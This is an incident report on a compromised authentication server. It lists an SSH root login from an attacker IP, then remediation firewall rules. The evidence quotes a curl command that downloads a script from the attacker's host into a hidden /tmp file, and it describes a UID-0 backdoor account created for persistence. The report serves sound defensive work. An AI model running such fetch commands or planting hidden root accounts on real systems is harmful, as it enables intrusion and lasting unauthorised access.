# Incident Report: Compromised Authentication Server

## Summary
- **Severity:** CRITICAL
- **Status:** System Compromised
- **Attacker IP:** `198.51.100.77`
- **Target Host:** `srv-auth-01`

## Evidence
- Successful SSH login as `root` from `198.51.100.77` on 2026-11-05 01:12:00.
- Privileged `sudo` execution downloading an external payload (`/usr/bin/curl -s http://198.51.100.77/x.sh -o /tmp/.x`).
- Creation of a backdoor privileged user account (`svc-backup`, UID 0, GID 0).

## Attacker Details
- **IP Address:** `198.51.100.77`

## Post-Exploitation Activity
- Downloaded malicious script to `/tmp/.x`.
- Created a persistent backdoor root-level account (`svc-backup`).

## Firewall Remediation Commands
```bash
ufw deny from 198.51.100.77 to any port 22
iptables -A INPUT -p tcp --dport 22 -s 198.51.100.77 -j DROP
```
